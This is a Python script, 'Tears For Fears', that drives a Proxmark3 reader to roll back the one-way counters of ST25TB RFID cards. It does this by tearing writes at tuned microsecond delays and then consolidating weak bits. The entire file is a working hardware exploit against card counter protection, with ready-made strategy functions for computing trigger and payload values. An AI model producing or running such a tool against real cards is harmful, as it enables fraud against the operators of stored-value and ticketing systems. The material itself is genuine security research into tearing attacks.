#!/usr/bin/env python3
# -*- coding: utf-8 -*-

#+---------------------------------------------------------------------------+
#|    Tears For Fears : Utilities for reverting counters of ST25TB* cards    |
#+---------------------------------------------------------------------------+
#| Copyright (C) Pierre Granier - 2024                                       |
#|                                                                           |
#| This program is free software: you can redistribute it and/or modify      |
#| it under the terms of the GNU General Public License as published by      |
#| the Free Software Foundation, either version 3 of the License, or         |
#| (at your option) any later version.                                       |
#|                                                                           |
#| This program is distributed in the hope that it will be useful,           |
#| but WITHOUT ANY WARRANTY; without even the implied warranty of            |
#| MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the              |
#| GNU General Public License for more details.                              |
#|                                                                           |
#| You should have received a copy of the GNU General Public License         |
#| along with this program. If not, see <http://www.gnu.org/licenses/>.      |
#+---------------------------------------------------------------------------+
#
# Ref:
#  https://gitlab.com/SiliconOtter/tears4fears
#

import argparse
from queue import Queue, Empty
import re
from subprocess import Popen, PIPE
from time import sleep
from threading import Thread

PM3_SUBPROC = None
PM3_SUBPROC_QUEUE = None


class colors:

    reset = '\033[0m'
    bold = '\033[01m'
    disable = '\033[02m'
    underline = '\033[04m'
    reverse = '\033[07m'
    strikethrough = '\033[09m'
    invisible = '\033[08m'

    purple = '\033[35m'
    red = '\033[31m'
    green = '\033[32m'
    blue = '\033[34m'
    lightred = '\033[91m'
    lightgreen = '\033[92m'
    lightblue = '\033[94m'


def main():

    global PM3_SUBPROC
    global PM3_SUBPROC_QUEUE

    parser = argparse.ArgumentParser()
    parser.add_argument("-s",
                        "--strat",
                        type=int,
                        nargs="?",
                        const="1",
                        default="1",
                        dest="strategy",
                        help="Strategy to use (default 1)")
    parser.add_argument("-b",
                        "--block",
                        type=int,
                        nargs="?",
                        const="-1",
                        default="-1",
                        required=True,
                        dest="target_block",
                        help="Target Block")
    parser.add_argument("-p",
                        "--pm3-client",
                        type=str,
                        default="pm3",
                        dest="pm3_path",
                        help="pm3 client path")

    args = parser.parse_args()

    PM3_SUBPROC = Popen([args.pm3_path, "-i", "-f"], stdin=PIPE, stdout=PIPE)
    PM3_SUBPROC_QUEUE = Queue()

    thread = Thread(target=enqueue_output, args=(PM3_SUBPROC.stdout, PM3_SUBPROC_QUEUE))
    thread.start()

    if args.target_block != -1:
        tear_for_fears(args.target_block, args.strategy)
    else:
        parser.error("--block is required ")

    sub_com('exit')
    thread.join()


def enqueue_output(out, queue):
    """Continuously read PM3 client stdout and fill a global queue

    Args:
      out: stdout of PM3 client
      queue: where to push "out" content
    """
    for line in iter(out.readline, b""):
        queue.put(line)
    out.close()


def sub_com(command, func=None, sleep_over=0):
    """Send command to aPM3 client

    Args:
      command: String of the command to send
      func: hook for a parsing function on the pm3 command end

    Returns:
      result of the hooked function if any
    """
    global PM3_SUBPROC
    global PM3_SUBPROC_QUEUE

    result = None

    sleep(sleep_over)

    PM3_SUBPROC.stdin.write(bytes((command + "\n").encode("ascii")))
    PM3_SUBPROC.stdin.flush()
    if func:
        while not result:
            try:
                result = func(str(PM3_SUBPROC_QUEUE.get(timeout=.5)))
            except Empty:
                PM3_SUBPROC.stdin.write(bytes(
                    (command + "\n").encode("ascii")))
                PM3_SUBPROC.stdin.flush()

    return result


def set_space(space):
    """Placeholder for instrumentalization or do it manually

    Args:
      space: distance needed

    Returns:
    """
    input(f"\nSet Reader <-> Card distance to {space} and press enter : \n")


def parse_rdbl(str_to_parse):
    """Return a list of str of a block from pm3 output
    Uses `rbdl` in pm3 client

    Args:
      str_to_parse: string to parse

    Returns:
      string list
    """
    tmp = re.search(r"block \d*\.\.\. ([0-9a-fA-F]{2} ){4}", str_to_parse)
    if tmp:
        # print(tmp)
        return re.findall(r"[0-9a-fA-F]{2}", tmp.group(0).split("... ")[1])
    return None


def parse_UID(str_to_parse):
    """Return a card UID from pm3 output

    Args:
      str_to_parse: string to parse

    Returns:
      string list
    """
    tmp = re.search(r"UID: ([0-9a-fA-F]{2} )*", str_to_parse)
    if tmp:
        return re.findall(r"[0-9a-fA-F]{2}", tmp.group(0).split(": ")[1])
    return None


def slist_to_int(list_source):
    """Return the int value associated to a bloc list of string

    Args:
      list_source: list to convert

    Returns:
      represented int
    """
    return ((int(list_source[3], 16) << 24) + (int(list_source[2], 16) << 16) +
            (int(list_source[1], 16) << 8) + int(list_source[0], 16))


def int_to_slist(src):
    """Return the list of string from the int value associated to a block

    Args:
      src: int to convert

    Returns:
      list of string
    """
    list_dest = list()
    for i in range(4):
        list_dest.append(hex((src >> (8 * i)) & 255)[2:].zfill(2).upper())
    return list_dest


def ponderated_read(b_num, repeat_read, sleep_over):
    """read a few times a block and give a pondered dictionary

    Args:
      b_num: block number to read

    Returns:
      dictionary (key: int, value: number of occurrences)
    """
    weight_r = dict()

    for _ in range(repeat_read):
        # sleep_over=0 favorize read at 0
        # (and allow early discovery of weak bits)
        result = slist_to_int(
            sub_com(f"hf 14b rdbl -b {b_num}",
                    parse_rdbl,
                    sleep_over=sleep_over))
        if result in weight_r:
            weight_r[result] += 1
        else:
            weight_r[result] = 1

    return weight_r


def exploit_weak_bit(b_num, original_value, repeat_read, sleep_over):
    """

    Args:
      b_num: block number
      stop: last tearing timing

    """
    # Sending RAW writes because `wrbl` spend additionnal time checking success
    cmd_wrb = f"hf 14b raw --sr --crc -d 09{hex(b_num)[2:].rjust(2, '0')}"

    set_space(1)
    dic = ponderated_read(b_num, repeat_read, sleep_over)

    for value, occur in dic.items():

        indic = colors.reset

        if value > original_value:
            indic = colors.purple

        elif value < original_value:
            indic = colors.lightblue

        print(
            f"{(occur / repeat_read) * 100} %"
            f" : {indic}{''.join(map(str,int_to_slist(value)))}{colors.reset}"
            f" : {indic}{str(bin(value))[2:].zfill(32)}{colors.reset}")

    target = max(dic)

    read_back = 0

    # There is no ACK for write so we use a read to check distance coherence
    if target > (original_value):

        print(f"\n{colors.bold}Trying to consolidate.{colors.reset}"
              f"\nKeep card at the max distance from the reader.\n")

        while (read_back != (target - 1)):
            print(f"{colors.bold}Writing :{colors.reset}"
                  f" {''.join(map(str,int_to_slist(target - 1)))}")
            sub_com(f"{cmd_wrb}{''.join(map(str,int_to_slist(target - 1)))}")
            read_back = slist_to_int(
                sub_com(f"hf 14b rdbl -b {b_num}", parse_rdbl))

        while (read_back != (target - 2)):
            print(f"{colors.bold}Writing :{colors.reset}"
                  f" {''.join(map(str,int_to_slist(target - 2)))}")
            sub_com(f"{cmd_wrb}{''.join(map(str,int_to_slist(target - 2)))}")
            read_back = slist_to_int(
                sub_com(f"hf 14b rdbl -b {b_num}", parse_rdbl))

    set_space(0)


def strat_1_values(original_value):
    """return payload and trigger value depending on original_value
    follow strategy 1 rules

    Args:
      original_value: starting value before exploit

    Returns:
      (payload_value, trigger_value) if possible
      None otherwise
    """
    high1bound = 30

    # Check for leverageable bits positions,
    # Start from bit 32, while their is no bit at 1 decrement position
    while ((original_value & (0b11 << high1bound)) != (0b11 << high1bound)):
        high1bound -= 1
        if high1bound < 1:
            # No bits can be used as leverage
            return None

    low1bound = high1bound

    # We found a suitable pair of bits at 1,
    # While their is bits at 1, decrement position
    while ((original_value & (0b11 << low1bound)) == (0b11 << low1bound)):
        low1bound -= 1
        if low1bound < 1:
            # No bits can be reset
            return None

    trigger_value = (0b01 << (low1bound + 1)) ^ (2**(high1bound + 2) - 1)
    payload_value = (0b10 << (low1bound + 1)) ^ (2**(high1bound + 2) - 1)

    return (trigger_value, payload_value)


def strat_2_values(original_value):
    """return payload and trigger value depending on original_value
    follow strategy 2 rules

    Args:
      original_value: starting value before exploit

    Returns:
      (payload_value, trigger_value) if possible
      None otherwise
    """
    high1bound = 31

    # Check for leverageable bit position,
    # Start from bit 32, while their is no bit at 1 decrement position
    while not (original_value & (0b1 << high1bound)):
        high1bound -= 1
        if high1bound < 1:
            # No bits can be used as leverage
            return None

    low1bound = high1bound

    # We found a suitable bit at 1,
    # While their is bits at 1, decrement position
    while (original_value & (0b1 << low1bound)):
        low1bound -= 1
        if low1bound < 1:
            # No bits can be reset
            return None

    trigger_value = (0b1 << (low1bound + 1)) ^ (2**(high1bound + 1) - 1)
    payload_value = trigger_value ^ (2**min(low1bound, 4) - 1)

    return (trigger_value, payload_value)


def tear_for_fears(b_num, strategy):
    """try to roll back `b_num` counter using `strategy`

    Args:
      b_num: block number
    """

    ################################################################
    #########  You may want to play with theses parameters #########
    start_taring_delay = 130

    repeat_read = 8
    repeat_write = 5

    sleep_quick = 0
    sleep_long = 0.3
    ################################################################

    cmd_wrb = f"hf 14b raw --sr --crc -d 09{hex(b_num)[2:].rjust(2, '0')}"

    print(f"UID: { ''.join(map(str,sub_com('hf 14b info ', parse_UID)))}\n")

    tmp = ponderated_read(b_num, repeat_read, sleep_long)
    original_value = max(tmp, key=tmp.get)

    if strategy == 1:
        leverageable_values = strat_1_values(original_value)
    else:
        leverageable_values = strat_2_values(original_value)

    if leverageable_values is None:
        print(
            f"\n{colors.bold}No bits usable for leverage{colors.reset}\n"
            f"Current value : {''.join(map(str,int_to_slist(original_value)))}"
            f" : { bin(original_value)[2:].zfill(32)}")
        return

    else:
        (trigger_value, payload_value) = leverageable_values

    print(f"Initial Value : {''.join(map(str,int_to_slist(original_value)))}"
          f" : { bin(original_value)[2:].zfill(32)}")
    print(f"Trigger Value : {''.join(map(str,int_to_slist(trigger_value)))}"
          f" : { bin(trigger_value)[2:].zfill(32)}")
    print(f"Payload Value : {''.join(map(str,int_to_slist(payload_value)))}"
          f" : { bin(payload_value)[2:].zfill(32)}\n")

    print(
        f"{colors.bold}Color coding :{colors.reset}\n"
        f"{colors.reset}\tValue we started with{colors.reset}\n"
        f"{colors.green}\tTarget value (trigger|payload){colors.reset}\n"
        f"{colors.lightblue}\tBelow target value (trigger|payload){colors.reset}\n"
        f"{colors.lightred}\tAbove target value (trigger|payload){colors.reset}\n"
        f"{colors.purple}\tAbove initial value {colors.reset}")

    if input(f"\n{colors.bold}Good ? Y/n : {colors.reset}") == "n":
        return

    trigger_flag = False
    payload_flag = False
    t4fears_flag = False

    print(f"\n{colors.bold}Write and tear trigger value : {colors.reset}"
          f"{''.join(map(str,int_to_slist(trigger_value)))}\n")

    tear_us = start_taring_delay

    while not trigger_flag:

        for _ in range(repeat_write):

            if t4fears_flag:
                exploit_weak_bit(b_num, original_value, repeat_read,
                                 sleep_long)

            if trigger_flag:
                break

            sub_com(
                f"hw tearoff --delay {tear_us} --on ; "
                f"{cmd_wrb}{''.join(map(str, int_to_slist(trigger_value)))}")

            preamb = f"Tear timing = {tear_us:02d} us : "
            print(preamb, end="")

            trigger_flag = True

            for value, occur in ponderated_read(b_num, repeat_read,
                                                sleep_quick).items():

                indic = colors.reset
                # Here we want 100% chance of having primed one sub-counter
                # The logic is inverted for payload
                if value > original_value:
                    indic = colors.purple
                    t4fears_flag = True
                    trigger_flag = False

                elif value == trigger_value:
                    indic = colors.green

                elif value < original_value:
                    indic = colors.lightblue

                else:
                    trigger_flag = False

                print(
                    f"{(occur / repeat_read) * 100:3.0f} %"
                    f" : {indic}{''.join(map(str,int_to_slist(value)))}"
                    f"{colors.reset} : {indic}"
                    f"{str(bin(value))[2:].zfill(32)}{colors.reset}",
                    end=f"\n{' ' * len(preamb)}")

            print()

        tear_us += 1

    print(f"\n{colors.bold}Write and tear payload value : {colors.reset}"
          f"{''.join(map(str,int_to_slist(payload_value)))}\n")

    tear_us = start_taring_delay

    while True:

        for _ in range(repeat_write):

            if payload_flag:

                exploit_weak_bit(b_num, original_value, repeat_read,
                                 sleep_long)

                tmp = ponderated_read(b_num, repeat_read, sleep_long)
                if max(tmp, key=tmp.get) > original_value:
                    print(f"{colors.bold}Success ! {colors.reset}")
                    return
                else:
                    payload_flag = False

            sub_com(
                f"hw tearoff --delay {tear_us} --on ; "
                f"{cmd_wrb}{''.join(map(str, int_to_slist(payload_value)))}")

            preamb = f"Tear timing = {tear_us:02d} us : "
            print(preamb, end="")

            for value, occur in ponderated_read(b_num, repeat_read,
                                                sleep_quick).items():

                indic = colors.reset

                if value > original_value:
                    indic = colors.purple
                    payload_flag = True

                elif value == payload_value:
                    indic = colors.green
                    payload_flag = True

                elif value < trigger_value:
                    indic = colors.lightblue

                elif value > trigger_value:
                    indic = colors.lightred

                print(
                    f"{(occur / repeat_read) * 100:3.0f} %"
                    f" : {indic}{''.join(map(str,int_to_slist(value)))}"
                    f"{colors.reset} : {indic}"
                    f"{str(bin(value))[2:].zfill(32)}{colors.reset}",
                    end=f"\n{' ' * len(preamb)}")

            print()

        tear_us += 1


if __name__ == "__main__":
    main()
